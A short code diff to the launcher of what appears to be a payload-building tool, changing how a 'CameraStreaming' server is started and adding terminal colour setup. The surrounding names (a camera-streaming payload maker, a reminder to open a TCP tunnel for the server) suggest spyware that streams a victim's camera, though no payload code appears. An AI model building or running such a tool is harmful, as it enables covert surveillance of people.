@@ -23,10 +23,11 @@ import json
 from configparser import ConfigParser
 import socket
 from payloads.makers.CameraStreamingPayloadMaker import * #this just the CameraStreaming payload maker and wee are import the class that makes the paylaod
-#from server.types.CameraStreaming import CAMERA_STREAMING_PORT, CONFIG_FILE, run as CameraStreamingStart
+from server.types.CameraStreaming import run as CameraStreamingStart
 #setting colors
+from colorama import init
 CR = colors #colors class from assets/colors.py
-
+init()
 #configs editing
 CONFIG_PARSER = ConfigParser()
 
@@ -135,4 +136,5 @@ elif __USE__:
             CONFIG_PARSER.write(CONFIG_DES)
         print(f"{Ssowrd} {CR.red()}Note: {CR.yellow()}make sure to start a tcp tunnel for server")
         input("")
-        os.system("python server/types/CameraStreaming.py")
+        CameraStreamingStart()
+        #os.system("python server/types/CameraStreaming.py")
